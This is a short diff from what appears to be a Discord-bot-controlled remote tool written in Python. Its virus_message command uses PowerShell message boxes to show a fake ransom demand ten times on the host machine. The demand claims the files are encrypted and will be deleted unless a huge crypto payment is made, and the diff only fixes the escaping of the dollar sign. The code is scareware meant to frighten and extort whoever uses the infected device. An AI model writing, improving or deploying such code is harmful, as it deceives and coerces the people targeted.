@@ -491,7 +491,7 @@ async def virus_message(ctx):
         await send_embed(ctx, "Virus Alert", "Displaying fake virus messages on screen", discord.Color.red())
         
         for x in range(0, 10):
-            msg = "WARNING! This device is filled with viruses. If you would like to get rid of it, pay \$234,324,214 in crypto and we will remove it. You have 24 hours to pay before all your devices content is deleted. Don't even try find or delete the virus, or save your files (they are encrypted) otherwise the auto destroy will activate. Have fun :)"
+            msg = "WARNING! This device is filled with viruses. If you would like to get rid of it, pay $234,324,214 in crypto and we will remove it. You have 24 hours to pay before all your devices content is deleted. Don't even try find or delete the virus, or save your files (they are encrypted) otherwise the auto destroy will activate. Have fun :)"
 
             subprocess.run(f"""PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg}')" """, shell=True, capture_output=True, text=True)
     except Exception as e:
